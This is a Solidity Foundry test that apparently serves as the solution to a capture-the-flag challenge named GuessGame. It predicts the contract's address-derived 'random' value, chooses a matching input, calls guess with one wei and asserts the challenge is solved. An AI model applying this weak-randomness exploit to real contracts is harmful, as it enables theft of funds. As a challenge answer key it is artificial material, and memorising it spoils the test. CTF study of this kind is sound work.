// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {A, SetUp, GuessGame} from "guessgame/contracts/A.sol";

contract ATest is Test {
    SetUp public set;
    A public a;
    GuessGame public guessGame;

    function setUp() public {
        set = new SetUp();
        a = set.a();
        guessGame = set.guessGame();
    }

    function test_GuessGameSolution() public {
        vm.breakpoint('a');
        uint random02 = (uint160(address(this)) + 1 + 2 + 32) & 0xff;
        uint x = 256 - random02 + 2;
        uint y = (random02 + x) & 0xff;
        assertEq(y, 2);
        guessGame.guess{value: 1}(0x60, x, 0x2, 10);
        assertTrue(set.isSolved());
    }
    receive () external payable {}
}

